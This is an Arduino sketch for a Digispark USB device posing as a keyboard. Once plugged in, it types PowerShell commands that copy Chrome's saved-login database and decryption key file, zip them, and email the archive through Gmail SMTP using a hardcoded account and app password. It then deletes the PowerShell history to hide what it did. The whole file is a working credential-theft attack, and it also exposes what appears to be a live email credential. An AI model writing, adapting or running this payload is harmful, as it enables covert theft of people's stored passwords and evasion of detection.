// the setup routine runs once when you press reset:
#include <DigiKeyboard.h>

void setup() {                
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A
  // Open Powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("cd $env:USERPROFILE; mkdir temp; copy $env:USERPROFILE'/AppData/Local/Google/Chrome/User Data/Local State' $env:USERPROFILE'/temp'; copy $env:USERPROFILE'/AppData/Local/Google/Chrome/User Data/Default/Login Data' $env:USERPROFILE'/temp'"));
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);
  DigiKeyboard.print(F("Compress-Archive -Path './temp/' -DestinationPath $env:USERPROFILE'/senhas.zip'"));
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('edu.netgaming@gmail.com', 'ikxoyglfyihpwixq'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'edu.netgaming@gmail.com'; $ReportEmail.To.Add('edu.netgaming@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Digispark report'; $ReportEmail.Attachments.Add('senhas.zip'); $SMTPInfo.Send($ReportEmail)"));
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // cd $env:USERPROFILE
  // mkdir temp
  //
  // copy $env:USERPROFILE'/AppData/Local/Google/Chrome/User Data/Local State' $env:USERPROFILE'/temp'
  // copy $env:USERPROFILE'/AppData/Local/Google/Chrome/User Data/Default/Login Data' $env:USERPROFILE'/temp'
  // Compress-Archive -Path '.\temp\' -DestinationPath $env:USERPROFILE'/senhas.zip'
 }

// the loop routine runs over and over again forever:
void loop() {
  digitalWrite(1, HIGH);   // turn the LED on (HIGH is the voltage level)
  //digitalWrite(0, HIGH);
  delay(500);               // wait for a second
  digitalWrite(1, LOW);    // turn the LED off by making the voltage LOW
  //digitalWrite(0, LOW); 
  delay(500);               // wait for a second
}
